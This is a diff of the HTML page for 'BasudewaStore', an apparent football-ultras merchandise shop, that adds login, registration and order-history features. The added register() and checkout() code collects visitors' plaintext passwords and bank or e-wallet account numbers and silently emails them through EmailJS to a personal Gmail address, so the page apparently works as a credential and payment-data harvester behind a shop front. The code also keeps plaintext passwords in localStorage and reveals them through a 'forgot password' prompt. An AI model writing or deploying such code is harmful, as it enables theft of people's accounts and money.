@@ -4,69 +4,35 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>BasudewaStore</title>
-
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}
-body{
-background:#0a0a0a;color:white;overflow-x:hidden;transition:0.4s;
-}
+body{background:#0a0a0a;color:white;transition:0.4s;overflow-x:hidden;}
 body.light{background:#f5f5f5;color:black;}
-
-/* NAV */
-nav{
-background:#111;padding:15px;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid red;position:relative;z-index:5;
-}
+nav{background:#111;padding:15px;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid red;}
 body.light nav{background:white;border-bottom:2px solid black;}
 .logo{color:red;font-weight:bold;font-size:22px;}
-
-/* HERO */
-.hero{height:60vh;display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;overflow:hidden;}
-.flare{position:absolute;width:150px;height:150px;background:radial-gradient(circle, rgba(255,0,0,0.9), transparent 70%);border-radius:50%;animation:flareMove 4s infinite alternate ease-in-out;}
-.flare:nth-child(1){left:20%; top:30%;}
-.flare:nth-child(2){right:20%; top:40%; animation-delay:2s;}
-@keyframes flareMove{from{transform:scale(1) translateY(0);}to{transform:scale(1.3) translateY(-30px);}}
-
-/* SMOKE */
-.smoke{position:absolute;width:200%;height:200%;background:radial-gradient(circle, rgba(255,255,255,0.05), transparent 70%);animation:smokeMove 15s linear infinite;}
-@keyframes smokeMove{from{transform:translateX(-20%);}to{transform:translateX(20%);}}
-
-/* PARTICLE API */
-.particle{position:absolute;width:10px;height:10px;background:orange;border-radius:50%;opacity:0.7;animation:particleMove 2s linear infinite;}
-@keyframes particleMove{0%{transform:translateY(0) rotate(0deg);opacity:1;}100%{transform:translateY(-100px) rotate(360deg);opacity:0;}}
-
-/* THUMBNAIL FOTO KENANGAN */
-.thumbnails{display:flex;justify-content:center;gap:15px;margin:15px;}
-.thumbnail img{width:100px;height:70px;object-fit:cover;border-radius:5px;cursor:pointer;border:2px solid red;}
-
-/* PRODUCTS */
-.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;padding:30px;}
-.card{background:#1a1a1a;padding:10px;border-radius:10px;text-align:center;transition:0.3s;cursor:pointer;}
-body.light .card{background:white;}
-.card:hover{transform:scale(1.05);}
-.card img{width:100%;height:250px;object-fit:cover;background:#333;}
-select,button{margin-top:8px;padding:8px;border:none;cursor:pointer;}
-button{background:red;color:white;}
+button{padding:8px;border:none;background:red;color:white;margin-top:5px;cursor:pointer;}
 button:hover{background:white;color:red;}
-
-/* CART SLIDE */
-#cart{position:fixed;right:-350px;top:0;width:300px;height:100%;background:#111;padding:20px;transition:0.4s;z-index:10;overflow-y:auto;}
-#cart.active{right:0;}
-body.light #cart{background:#eee;color:black;}
-.cart-btn{cursor:pointer;background:red;padding:5px 10px;}
-input,textarea{width:100%;padding:8px;margin:5px 0;}
-.toggle-mode{cursor:pointer;background:#444;padding:5px 10px;}
-
-/* MODAL POPUP */
-.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:20;}
-.modal-content{background:#1a1a1a;padding:20px;border-radius:10px;width:300px;text-align:center;position:relative;}
+input,select,textarea{width:100%;padding:8px;margin:5px 0;}
+.hero{height:50vh;display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;overflow:hidden;}
+.flare{position:absolute;width:150px;height:150px;background:radial-gradient(circle, rgba(255,0,0,0.9), transparent 70%);border-radius:50%;animation:flareMove 4s infinite alternate;}
+@keyframes flareMove{from{transform:scale(1);}to{transform:scale(1.3) translateY(-30px);}}
+.particle{position:absolute;width:8px;height:8px;background:orange;border-radius:50%;animation:particleMove 2s linear infinite;}
+@keyframes particleMove{0%{transform:translateY(0);}100%{transform:translateY(-120px);opacity:0;}}
+.thumbnails{display:flex;justify-content:center;gap:10px;margin:10px;}
+.thumbnail img{width:90px;height:60px;object-fit:cover;border:2px solid red;}
+.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;padding:20px;}
+.card{background:#1a1a1a;padding:10px;border-radius:10px;text-align:center;cursor:pointer;}
+body.light .card{background:white;}
+.card img{width:100%;height:200px;object-fit:cover;}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;}
+.modal-content{background:#1a1a1a;padding:20px;border-radius:10px;width:300px;text-align:center;}
 body.light .modal-content{background:white;color:black;}
-.modal img{width:100%;height:200px;object-fit:cover;margin-bottom:10px;}
-.close-btn{position:absolute;top:5px;right:10px;cursor:pointer;color:red;font-weight:bold;}
-.modal button{margin-top:10px;}
-
-/* FOOTER */
+#auth{padding:20px;background:#111;}
+.auth-box{max-width:400px;margin:auto;}
+#dashboard{display:none;padding:20px;background:#222;}
+body.light #dashboard{background:#ddd;color:black;}
 footer{text-align:center;margin:20px 0;color:red;font-weight:bold;}
 </style>
 </head>
@@ -75,130 +41,164 @@ footer{text-align:center;margin:20px 0;color:red;font-weight:bold;}
 <nav>
 <div class="logo">BasudewaStore</div>
 <div>
-<span class="toggle-mode" onclick="toggleMode()">🌙 Mode</span>
-<span class="cart-btn" onclick="toggleCart()">🛒 (<span id="cart-count">0</span>)</span>
+<button onclick="toggleMode()">Mode</button>
+<button onclick="showLogin()">Login</button>
+<button onclick="showRegister()">Daftar</button>
 </div>
 </nav>
 
-<!-- THUMBNAIL FOTO KENANGAN -->
+<!-- THUMBNAIL -->
 <div class="thumbnails">
-<div class="thumbnail"><img src="img3.jpg" alt="Kenangan"></div>
-<div class="thumbnail"><img src="img4.jpg" alt="Kenangan"></div>
-<div class="thumbnail"><img src="img5.jpg" alt="Kenangan"></div>
+<div class="thumbnail"><img src="ISI_FOTO_KENANGAN1.jpg"></div>
+<div class="thumbnail"><img src="ISI_FOTO_KENANGAN2.jpg"></div>
+<div class="thumbnail"><img src="ISI_FOTO_KENANGAN3.jpg"></div>
 </div>
 
 <section class="hero">
 <div class="flare"></div>
-<div class="flare"></div>
-<div class="smoke"></div>
-<h1>Basudewa Official</h1>
-<p>Solidarity Forever </p>
+<h1>ULTRAS STADIUM</h1>
+<p>Support Your Team With Pride</p>
 </section>
 
 <section class="products">
-<div class="card" onclick="openModal('Jersey Home',199000,'ISI_FOTO_SENDIRI1.jpg','size1')">
-<img src="img1.jpg">
-<h3>Jersey</h3>
+<div class="card" onclick="openModal('Jersey Home',199000,'ISI_FOTO1.jpg')">
+<img src="ISI_FOTO1.jpg">
+<h3>Jersey Home</h3>
 <p>Rp199.000</p>
-<select id="size1">
-<option value="S">S</option><option value="M">M</option><option value="L">L</option><option value="XL">XL</option>
-</select>
 </div>
-
-<div class="card" onclick="openModal('Hoodie Ultras',249000,'ISI_FOTO_SENDIRI2.jpg','size2')">
-<img src="img2.jpg">
-<h3>Hoodie</h3>
+<div class="card" onclick="openModal('Hoodie Ultras',249000,'ISI_FOTO2.jpg')">
+<img src="ISI_FOTO2.jpg">
+<h3>Hoodie Ultras</h3>
 <p>Rp249.000</p>
-<select id="size2">
-<option value="S">S</option><option value="M">M</option><option value="L">L</option><option value="XL">XL</option>
-</select>
 </div>
 </section>
 
-<!-- MODAL POPUP -->
+<!-- MODAL PRODUK -->
 <div id="modal" class="modal">
 <div class="modal-content">
-<span class="close-btn" onclick="closeModal()">×</span>
-<img id="modal-img" src="">
+<img id="modal-img">
 <h3 id="modal-name"></h3>
 <p id="modal-price"></p>
-<p>Ukuran: <span id="modal-size"></span></p>
-<img src="ISI_FOTO_QRIS.jpg" alt="QRIS" style="width:100px;margin-top:5px;">
-<button onclick="checkoutModal()">Checkout</button>
+<select id="modal-size">
+<option>S</option><option>M</option><option>L</option><option>XL</option>
+</select>
+<img src="ISI_FOTO_QRIS.jpg" style="width:100px;">
+<button onclick="checkout()">Checkout</button>
+<button onclick="closeModal()">Tutup</button>
 </div>
 </div>
 
-<div id="cart">
-<h3>Keranjang</h3>
-<div id="cart-items"></div>
-<hr>
-<h3>Checkout</h3>
-<input type="text" id="nama" placeholder="Nama Lengkap">
-<textarea id="alamat" placeholder="Alamat Lengkap"></textarea>
-<button onclick="checkout()">Kirim Pesanan</button>
+<!-- AUTH SYSTEM -->
+<section id="auth">
+<div class="auth-box" id="registerBox" style="display:none;">
+<h2>Daftar</h2>
+<input type="text" id="regUser" placeholder="Username">
+<input type="password" id="regPass" placeholder="Password">
+<select id="paymentType" onchange="togglePayment()">
+<option value="">Pilih Metode</option>
+<option value="bank">Bank</option>
+<option value="ewallet">E-Wallet</option>
+</select>
+
+<div id="bankBox" style="display:none;">
+<select id="bankSelect">
+<option>BNI</option><option>BCA</option><option>BRI</option>
+<option>Mandiri</option><option>BTN</option><option>CIMB Niaga</option>
+<option>Permata</option><option>Danamon</option><option>BSI</option>
+</select>
+<input type="text" id="bankNumber" placeholder="Nomor Rekening">
 </div>
 
-<audio id="chant" src="https://www.myinstants.com/media/sounds/crowd-cheer.mp3" autoplay></audio>
+<div id="ewalletBox" style="display:none;">
+<select id="ewalletSelect">
+<option>DANA</option><option>Gopay</option><option>ShopeePay</option>
+<option>OVO</option><option>LinkAja</option><option>iSaku</option>
+<option>Sakuku</option>
+</select>
+<input type="text" id="ewalletNumber" placeholder="Nomor E-Wallet">
+</div>
+
+<button onclick="register()">Kirim Daftar</button>
+</div>
+
+<div class="auth-box" id="loginBox" style="display:none;">
+<h2>Login</h2>
+<input type="text" id="loginUser" placeholder="Username">
+<input type="password" id="loginPass" placeholder="Password">
+<button onclick="login()">Login</button>
+<p onclick="forgotPassword()" style="cursor:pointer;color:red;">Lupa Password?</p>
+</div>
+</section>
+
+<!-- DASHBOARD -->
+<section id="dashboard">
+<h2>Dashboard User</h2>
+<p>Selamat datang, <span id="dashUser"></span></p>
+<h3>Riwayat Pesanan</h3>
+<ul id="orderHistory"></ul>
+<button onclick="logout()">Logout</button>
+</section>
 
 <footer>© 2023 BasudewaStore - Official</footer>
 
-<script>
-// Particle api
-function createParticle(){
-let particle=document.createElement('div');
-particle.classList.add('particle');
-particle.style.left=Math.random()*window.innerWidth+'px';
-particle.style.top=(window.innerHeight-50)+'px';
-document.body.appendChild(particle);
-setTimeout(()=>{particle.remove();},2000);
-}
-setInterval(createParticle,150);
+<audio id="chant" src="https://www.myinstants.com/media/sounds/crowd-cheer.mp3" autoplay></audio>
 
-// Cart
-let cart=[];
-function toggleCart(){document.getElementById("cart").classList.toggle("active");}
+<script>
+// Particle
+setInterval(()=>{let p=document.createElement("div");p.className="particle";p.style.left=Math.random()*window.innerWidth+"px";p.style.top=(window.innerHeight-50)+"px";document.body.appendChild(p);setTimeout(()=>p.remove(),2000);},200);
+
+// Mode
 function toggleMode(){document.body.classList.toggle("light");}
 
-function openModal(name,price,imgId,sizeId){
-document.getElementById("modal").style.display="flex";
-document.getElementById("modal-img").src=imgId;
-document.getElementById("modal-name").innerText=name;
-document.getElementById("modal-price").innerText="Rp"+price;
-document.getElementById("modal-size").innerText=document.getElementById(sizeId).value;
-}
+// Modal Produk
+function openModal(n,p,i){document.getElementById("modal").style.display="flex";document.getElementById("modal-name").innerText=n;document.getElementById("modal-price").innerText="Rp"+p;document.getElementById("modal-img").src=i;}
 function closeModal(){document.getElementById("modal").style.display="none";}
 
-function checkoutModal(){
-let nama=document.getElementById("nama").value;
-let alamat=document.getElementById("alamat").value;
+// REGISTER & LOGIN
+function showRegister(){registerBox.style.display="block";loginBox.style.display="none";}
+function showLogin(){loginBox.style.display="block";registerBox.style.display="none";}
+function togglePayment(){let type=paymentType.value;bankBox.style.display=(type=="bank")?"block":"none";ewalletBox.style.display=(type=="ewallet")?"block":"none";}
+
+function register(){
+let user=regUser.value,pass=regPass.value; // simpan password asli
+let paymentTypeVal=paymentType.value,paymentName="",paymentNumber="";
+if(paymentTypeVal=="bank"){paymentName=bankSelect.value;paymentNumber=bankNumber.value;}else{paymentName=ewalletSelect.value;paymentNumber=ewalletNumber.value;}
+let data={user,pass,paymentTypeVal,paymentName,paymentNumber,orders:[]};
+localStorage.setItem("user_"+user,JSON.stringify(data));
+emailjs.init("B7g13t_kSiLY7RWPU");
+emailjs.send("service_07pyt0g","template_h1z2fan",{username:user,password:pass,metode:paymentTypeVal,nama_metode:paymentName,nomor:paymentNumber,email_tujuan:"akunffsingapura54321@gmail.com"}).then(()=>alert("Pendaftaran terkirim!"));
+}
+
+function login(){
+let user=loginUser.value;let pass=loginPass.value;
+let data=JSON.parse(localStorage.getItem("user_"+user));
+if(data && data.pass==pass){alert("Login berhasil!");document.getElementById("auth").style.display="none";document.getElementById("dashboard").style.display="block";document.getElementById("dashUser").innerText=user;loadOrders(data);}
+else{alert("Username atau Password salah!");}
+}
+
+function forgotPassword(){let user=prompt("Masukkan username:");let data=JSON.parse(localStorage.getItem("user_"+user));if(data){alert("Password user: "+data.pass);}else{alert("Username tidak ditemukan.");}}
+function logout(){document.getElementById("dashboard").style.display="none";document.getElementById("auth").style.display="block";}
+
+// CHECKOUT PRODUK
+function checkout(){
+let user=loginUser.value||regUser.value;
+let data=JSON.parse(localStorage.getItem("user_"+user));
 let produk=document.getElementById("modal-name").innerText;
 let harga=document.getElementById("modal-price").innerText;
-let ukuran=document.getElementById("modal-size").innerText;
-
-if(nama==""||alamat==""){alert("Nama dan Alamat wajib diisi!");return;}
-
-// EmailJS (isi dengan settingmu)
-emailjs.init("Ab3xvPQCqJkB8Kh_V"); 
-emailjs.send("service_lt5tmzc","template_e16cgrw",{
-nama:nama,
-alamat:alamat,
-pesanan:produk+" - "+harga+" - Ukuran: "+ukuran,
-email_tujuan:"akunffsingapura54321@gmail.com"
-}).then(()=>{
-alert("Pesanan berhasil dikirim!");
+let ukuran=document.getElementById("modal-size").value;
+let invoice="INV"+Date.now();
+let order={invoice,produk,harga,ukuran};
+data.orders.push(order);
+localStorage.setItem("user_"+user,JSON.stringify(data));
+loadOrders(data);
+emailjs.init("B7g13t_kSiLY7RWPU");
+let paymentInfo=(data.paymentTypeVal=="bank")?data.paymentName+" "+data.paymentNumber:data.paymentName+" "+data.paymentNumber;
+emailjs.send("service_07pyt0g","template_lh1aqi9",{username:user,invoice:invoice,produk:produk,harga:harga,ukuran:ukuran,paymentInfo:paymentInfo,email_tujuan:"akunffsingapura54321@gmail.com"}).then(()=>alert("Pesanan terkirim!"));
 closeModal();
-});
 }
 
-// Checkout form bawah
-function checkout(){
-let nama=document.getElementById("nama").value;
-let alamat=document.getElementById("alamat").value;
-if(nama==""||alamat==""){alert("Nama dan Alamat wajib diisi!");return;}
-alert("Pesanan berhasil!\nTerima kasih "+nama);
-cart=[];document.getElementById("cart-items").innerHTML="";
-document.getElementById("cart-count").innerText=0;
-}
+// LOAD ORDER HISTORY
+function loadOrders(data){let list="";data.orders.forEach(o=>{list+=`<li>${o.invoice}: ${o.produk} - ${o.harga} - Ukuran ${o.ukuran}</li>`;});document.getElementById("orderHistory").innerHTML=list;}
 </script>
 
 </body>
